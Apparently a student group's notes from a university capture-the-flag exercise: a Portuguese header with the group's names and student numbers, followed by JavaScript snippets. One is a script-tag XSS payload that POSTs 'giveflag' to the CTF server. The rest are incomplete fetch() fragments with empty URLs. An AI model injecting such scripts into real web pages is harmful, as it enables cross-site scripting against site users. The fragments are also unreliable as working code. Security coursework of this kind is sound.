
Breve descrição do grupo

* Turno: L06
* Grupo: 02
* Alunos:
    - Diogo Luís Henriques Costa up201906731 
    - Eunice Juliana Freitas Amorim up201904920
    - Francisco José Barbosa Marques Colino up201905405



<script> getFlag = function () {
    var xmlHttp = new XMLHttpRequest();     
    xmlHttp.open( "POST", "");    
    xmlHttp.setRequestHeader("User-Agent", "ctf-fsi.fe.up.pt:5002") 
    xmlHttp.send("giveflag");     
    return xmlHttp.responseText; }; 
    console.log(getFlag())
    </script>

    let headers = new Headers({
    "Accept"       : "application/json",
    "Content-Type" : "application/json",
    "User-Agent"   : "MY-UA-STRING"
});

fetch("", {
    method  : 'POST', 
    headers : headers 
    // ... etc
}).then( ...

fetch("",
{
    method: "POST",
    body: "giveflag"
})
.then(function(res){ console.log(res) })